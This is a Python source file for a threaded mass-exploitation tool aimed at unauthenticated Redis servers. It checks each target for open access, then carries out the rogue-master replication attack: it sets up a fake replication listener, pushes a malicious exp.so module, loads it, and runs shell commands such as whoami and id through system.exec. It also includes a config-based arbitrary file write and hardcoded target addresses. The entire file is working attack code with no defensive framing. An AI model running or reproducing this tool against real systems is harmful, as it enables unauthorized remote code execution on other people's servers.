import re
import os
import sys
import time
import socket
import codecs
import datetime
import threading



global outfile
outfile = time.strftime('result/%Y%m%d_%H%M%S.csv')
with open(outfile, 'w') as f:
    f.write('IP, whoami, id\n')
queue = []
free_port = []
mlock = threading.Lock()
unauth_file = "result/unauth.csv"
'''
ip = '192.168.122.128'
port = 6379
filename = "E:\\coding\\redis_tool\\redis-rce\\exp.so"
'''
class banner:
    def __init__(self):
        self.info = ''

    def show():
        print(self.info)



class redisObj(threading.Thread):
#class redisObj:
    def __init__(self, queue, filename):
        threading.Thread.__init__(self)
        self.lhost = ""
        self.unauth = False
        self.master = False
        self.sock = ""
        self.conf_data = {}
        self.raw_conf_data = {"config get dir":"", "config get dbfilename":"", "config get slaveof":""}
        self.version = ""
        self.info_data = ""
        self.filename = filename
        self.payload = open(filename,'rb').read()
        self.shell = False
        self.queue = queue
        self.ip = ''
        self.port = ''
        self.sock = ''
        self.lhost = ''
        self.info_data = ''
        self.version = ''
        # get version


    def send(self, command, sock=None):
        if sock is None:
            sock = self.sock
        # print(' [Client] > %s'%command)
        if sock.gettimeout != 0.3:
            sock.settimeout(0.3)
        cmd = command 
        try:
            cmd = cmd.encode("utf-8")
        except:
            cmd = cmd
        sock.send(cmd + b'\r\n')
        recv_data = b''
        while True:
            try:
                data = sock.recv(1024)
            except:
                break
            recv_data = recv_data + data
        data = recv_data.decode("utf-8")
        # print(" [Server] > %s" % data.replace('\r\n', '\n [Server] > '))
        return data

    def backup(self):
        print(" [+][%s:%s] Backing up the config of redis server." % (self.ip, self.port))
        # get original config data
        for cmd in self.raw_conf_data:
            self.raw_conf_data[cmd] = self.send(command=cmd)
        # get dir
        dir_data = self.raw_conf_data["config get dir"].split('\r\n')
        self.conf_data['dir'] = dir_data[-2]
        # get dbfilename
        dir_data = self.raw_conf_data["config get dbfilename"].split('\r\n')
        self.conf_data['dbfilename'] = dir_data[-2]
        # get slaveof
        if not self.master:
            ipport_data = self.raw_conf_data["config get slaveof"].split('\r\n')[-2].split(' ')
            self.conf_data['ip'] = ipport_data[0]
            self.conf_data['port'] = int(ipport_data[1])
        print(" [+][%s:%s] Completed back up the config of redis server." % (self.ip, self.port))
        # reset module
        "MODULE UNLOAD system"
        # handle conf data to dict
        ""
    
    def recover(self):
        print(" [+][%s:%s] Recovering the config of redis server." % (self.ip, self.port))
        # recover config of dir
        try:
            status = self.send(command='config set dir %s' % self.conf_data['dir'])
            new_conf_data = self.send(command='config get dir')
            if 'OK' in status and new_conf_data in self.raw_conf_data['config get dir']:
                pass
            else:
                raise Exception
        except Exception as e:
            print(" [-][%s:%s] Err: Recover dir config error.\nOriginal data:\n%s" % (self.ip, self.port, self.raw_conf_data['config get dir']))
            return False
        # recover config of dbfilename
        try:
            status = self.send(command='config set dbfilename %s' % self.conf_data['dbfilename'])
            new_conf_data = self.send(command='config get dbfilename')
            if 'OK' in status and new_conf_data in self.raw_conf_data['config get dbfilename']:
                pass
            else:
                raise Exception
        except Exception as e:
            print(" [-][%s:%s] Err: Recover dir config error.\nOriginal data:\n%s"% (self.ip, self.port, self.raw_conf_data['config get dbfilename']))
            return False
        # recover config of slaveof
        if not self.master:
            try:
                status = self.send(command='slaveof %s %i' % (self.conf_data['ip'], self.conf_data['port']))
                new_conf_data = self.send(command='config get slaveof')
                if 'OK' in status and new_conf_data in self.raw_conf_data['config get slaveof']:
                    pass
                else:
                    raise Exception
            except Exception as e:
                print(" [-][%s:%s] Err: Recover dir config error.\nOriginal data:\n%s"% (self.ip, self.port, self.raw_conf_data['config get slaveof']))
                return False
        # recover config of module
        if self.version.split('.')[0] in ['4','5']:
            1
        # recover success
        print(" [+][%s:%s] Recover redis config success!"%(self.ip, self.port))
        return True
    
    def authCheck(self):
        data = self.send(command="info")
        if "version" in data:
            self.unauth = True
            if "role:master" in data:
                self.master = True
        return data
    
    def fileCover(self, pdir, pdbfilename, content):
        result = True
        self.backup()
        command = ["config set dir %s" % pdir, "config set dbfilename %s" % pdbfilename, r'set xxx "\r\n\r\n%s\r\n\r\n"' % (content), "save"]
        try:
            for cmd in command:
                temp = self.send(command=cmd)
                if 'OK' not in temp:
                    raise Exception
        except Exception as e:
            print(" [-][%s:%s] Err: Run command %s error in fileCover.%s" % (self.ip, self.port, cmd, e))
            result = False
        self.recover()
        return result
    
    
    def cleanAllKeys(self):
        if "OK" in self.send(command='flushdb'):
            print(" [+][%s:%s] Cleaned all keys in current dbfile." % (self.ip, self.port))
            return True
        return False
    
    def slaveofRCE(self):
        print(' [*][%s:%s] Sending exploit file to redis server.' % (self.ip, self.port))
        result = True
        if 'unknown command' not in self.send("system.exec ls"):
            self.shell = True
            print(" [+][%s:%s] Module system is already exist." % (self.ip, self.port))
            return result
        self.backup()
        try:
            # local server listen
            lport = free_port.pop()
            self.send(command='config set dbfilename exp.so')
            self.send(command='slaveof %s %i' % (self.lhost, int(lport)))
            time.sleep(1)
            listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listen_sock.bind(('0.0.0.0', int(lport)))
            listen_sock.listen(10)
            cli, addr = listen_sock.accept()
            cli.settimeout(0.5)
            data = cli.recv(1024).decode('utf-8')
            # print(" [Server] > %s" % data.replace('\r\n', '\n [Server] > '))
            while True:
                if data.find("PING") > -1:
                    data = self.send(command="+PONG", sock=cli)
                elif data.find("REPLCONF") > -1:
                    data = self.send(command="+OK", sock=cli)
                elif data.find("PSYNC") > -1 or data.find("SYNC") > -1:
                    data = self.send(command="+FULLRESYNC " + "Z" * 40 + " 0", sock=cli)
                    data = self.send(command="$" + str(len(self.payload)), sock=cli)
                    data = self.send(command=self.payload, sock=cli)
                    break
            time.sleep(1)
            self.send(command='module load ./%s' % (os.path.basename(self.filename)))
            listen_sock.close()
            # print(module_list)
            if "system" in self.send(command='module list'):
                self.shell = True
            else:
                print(' [-][%s:%s] System not in the module list.' % (self.ip, self.port))
            print(' [+][%s:%s] Complete to load rce module on redis server.' % (self.ip, self.port))
        except Exception as e:
            print(e)
            result = False
        self.send(command='slaveof no one')
        self.recover()
        return result

    def cmd(self, command):
        if not self.shell:
            print(' [-][%s:%s] Redis shell is not active.' % (self.ip, self.port))
            return False
        try:
            temp = self.send(command=r'system.exec "%s"' % command)
            return temp
        except Exception as e:
            print(' [-][%s:%s] Redis shell is active, but there are some errors in running command.%s' % (self.ip, self.port, e))
            return False

    def run(self):
        ipp = self.queue.pop()
        self.ip = ipp.split(':')[0]
        self.port = ipp.split(':')[1]
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        # self.sock.settimeout(0.1)
        self.sock.connect((self.ip, int(self.port)))
        self.lhost = self.sock.getsockname()[0]
        self.info_data = self.authCheck()
        version_regex = "redis_version:\d{1,2}\.\d{1,2}\.\d{1,2}"
        self.version = re.findall(version_regex, self.info_data)[0].split(':')[-1]
        if self.unauth == True:
            writeToFile(unauth_file, '"%s"' % (ipp))
            if self.version.split('.')[0] in ['4','5']:
                if self.slaveofRCE():
                    whoami = self.cmd('whoami')
                    cid = self.cmd('id')
                    del_exp = self.cmd("rm %s/%s" % (self.conf_data['dir'], os.path.basename(self.filename)))
                    if whoami is not False and cid is not False:
                        if whoami is not True and cid is not True:
                            cid = cid.split('\r\n')[1]
                            whoami = whoami.split('\r\n')[1]
                            if whoami[-1] == '\n':
                                whoami = whoami[:-1]
                            if cid[-1] == '\n':
                                cid = cid[:-1]
                        print(' [+][%s:%s] Run `whoami`: %s' % (self.ip, self.port, whoami))
                        print(' [+][%s:%s] Run `cid`: %s' % (self.ip, self.port, cid))
                        #whoami = whoami.replace(',',' || ') 
                        #cid = cid.replace(',',' || ') 
                        writeToFile(outfile, r'"%s","%s","%s"'%(ipp, whoami, cid))

# thread control func
def t_join(m_count):
    tmp_count = 0
    i = 0
    while True:
        time.sleep(2)
        ac_count = threading.activeCount()
        if ac_count < m_count and ac_count == tmp_count:
            i+=1
        else:
            i = 0
        tmp_count = ac_count
        #print ac_count,queue.qsize()
        if (len(queue) == 0 and threading.activeCount() <= 1) or i > 5:
            break

# save result to file
def writeToFile(filename, content):
    if mlock.acquire(True):
        result = True
        try:
            file = codecs.open(filename, 'a', 'utf-8')
            file.write(content + '\n')
            file.close()
        except Exception as e:
            result = False
            print(" [-][%s] Err:" % (content.split(':')[0], e))
        mlock.release()
        return result

# log func
def logFile(path='./'):
    class Logger(object):
        def __init__(self, filename="Default.log", path="./"):
            self.terminal = sys.stdout
            self.log = open(os.path.join(path, filename), "a", encoding='utf8')
        def write(self, message):
            self.terminal.write(message)
            self.log.write(message)
        def flush(self):
            pass
    fileName = datetime.datetime.now().strftime('%Y-%m-%d.log')
    sys.stdout = Logger(fileName, path=path)
    # the content after here will be written to log file
    print((" LOG: %s " % fileName).center(60, '*'))
    print((" TIME: %s " % datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')).center(60, '*'))

# get free net port
def getFreePort():
    print(" [+] Loading free port ...")
    port = list(range(10000,45535))
    os_type = sys.platform
    if 'win' in os_type:
        try:
            result = os.popen('netstat -ano').read().split('\n')[4:]
            for line in result:
                if line == '':
                    continue
                temp = line.split(' ')
                while '' in temp:
                    temp.remove('')
                try:
                    port.remove(int(temp[1].split(':')[-1]))
                except Exception as e:
                    continue
        except Exception as e:
            print(e)
    elif 'linux' in os_type:
        result = os.popen('netstat -pantu').read().split('\n')[2:]
        for line in result:
                if line == '':
                    continue
                temp = line.split(' ')
                while '' in temp:
                    temp.remove('')
                try:
                    port.remove(int(temp[3].split(':')[-1]))
                except Exception as e:
                    continue
    else:
        print( ' [-] Err: Unknow system type %s.'%os_type)
        return False
    return port

def readTargets(filename):
    file = open(filename, 'r').read().split('\n')
    targets = []
    for line in file:
        if line == '':
            continue
        try:
            tmp = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}', line)[0]
            if tmp == line:
                targets.append(line)
        except:
            try:
                tmp = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line)[0]
                if tmp == line:
                    targets.append(line + ':6379')
            except:
                print(" [-] Warn: Read target %s error, and it will be ignore." % (line))
    return targets


free_port = getFreePort()
if __name__ == "__main__":
    targetfile = "1.txt"
    # queue = readTargets(targetfile)
    # queue = ['99.1.22.10:16379', '99.1.22.10:26379', '99.1.22.10:36379', '99.1.22.10:46379', '99.1.22.10:56379']
    queue = ['99.1.22.6:6379']
    logFile(path='log/')
    ipports = []
    expfilename = 'exp.so'
    m_count = 20
    if m_count > len(queue):
        m_count = len(queue)
    try:
        for i in range(m_count):
            t = redisObj(queue, expfilename)
            t.setDaemon(True)
            t.start()
        t_join(m_count)
    except Exception as e:
        print(e)
